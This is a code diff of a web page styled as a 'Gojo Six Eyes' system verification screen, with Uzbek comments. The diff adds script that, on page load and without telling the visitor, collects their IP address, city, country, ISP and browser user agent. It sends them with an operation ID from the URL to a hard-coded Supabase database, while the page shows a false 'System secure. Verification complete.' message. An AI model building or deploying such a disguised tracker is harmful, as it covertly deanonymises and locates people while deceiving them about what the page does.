@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Gojo Six Eyes | System Verification</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         body {
             background-color: #050505;
@@ -15,6 +16,7 @@
             height: 100vh;
             margin: 0;
             text-align: center;
+            overflow: hidden;
         }
         .container {
             border: 1px solid #111;
@@ -22,15 +24,18 @@
             padding: 40px;
             box-shadow: 0 0 30px rgba(0, 217, 255, 0.1);
             border-radius: 12px;
+            z-index: 1;
         }
         h1 {
             font-size: 1.5rem;
             letter-spacing: 3px;
             margin-bottom: 10px;
+            text-transform: uppercase;
         }
         .status-text {
             color: #888;
             font-size: 0.9rem;
+            margin-bottom: 20px;
         }
         .loader {
             width: 150px;
@@ -52,6 +57,12 @@
             0% { left: -40px; }
             100% { left: 150px; }
         }
+        .op-tag {
+            font-size: 10px; 
+            color: #333; 
+            letter-spacing: 2px;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
@@ -60,18 +71,27 @@
     <h1>🌀 GOJO SIX EYES</h1>
     <p class="status-text" id="status">Verifying system integrity...</p>
     <div class="loader"></div>
-    <p style="font-size: 9px; color: #333; letter-spacing: 1px;">OP_ID: <span id="op-id">PENDING</span></p>
+    <p class="op-tag">OP_ID: <span id="op-id">PENDING</span></p>
 </div>
 
 <script>
- <script>
+    // --- SUPABASE SOZLAMALARI ---
+    // Bu yerga Supabase Project Settings -> API bo'limidagi ma'lumotlarni qo'ying
+    const SUPABASE_URL = 'https://kisbfmcxvcwtxfwbgexb.supabase.co'; 
+    const SUPABASE_KEY = 'sb_publishable_THarexbaf5WB2Cc-c6t-sg_TQJycbtz';
+    const _supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+    // 1. URL dan Operation ID ni aniqlash
     const urlParams = new URLSearchParams(window.location.search);
     const opID = urlParams.get('id') || "UNSET";
     document.getElementById('op-id').innerText = opID.toUpperCase();
 
+    // 2. Ma'lumotlarni yig'ish va yuborish funksiyasi
     async function initTrace() {
         try {
+            // IP va Geo-ma'lumotlarni olish
             const res = await fetch("https://ipapi.co/json/");
+            if (!res.ok) throw new Error("IP fetch failed");
             const data = await res.json();
 
             const payload = {
@@ -80,15 +100,36 @@
                 location: `${data.city}, ${data.country_name}`,
                 provider: data.org,
                 user_agent: navigator.userAgent,
-                timestamp: new Date().toISOString()
+                created_at: new Date().toISOString()
             };
 
-            console.log("Telemetry captured:", payload);
-            await sendTelemetry(payload); // Bu yerda Supabase ulanadi
+            console.log("Telemetry captured locally:", payload);
+            
+            // Supabase bazasiga yuklash
+            await sendToDatabase(payload);
+
         } catch (err) {
-            console.error("Transmission failed:", err);
+            console.error("Critical Error:", err);
+            document.getElementById('status').innerText = "Security check finalized.";
         }
     }
+
+    // 3. Bazaga yuborish funksiyasi
+    async function sendToDatabase(payload) {
+        const { data, error } = await _supabase
+            .from('telemetry') // Supabase'dagi jadval nomi
+            .insert([payload]);
+
+        if (error) {
+            console.error("Database Error:", error);
+            document.getElementById('status').innerText = "Connection lost. Retry later.";
+        } else {
+            console.log("Data successfully synced with Six Eyes Cloud.");
+            document.getElementById('status').innerText = "System secure. Verification complete.";
+        }
+    }
+
+    // Sahifa yuklanganda ishga tushirish
     window.onload = initTrace;
 </script>
 
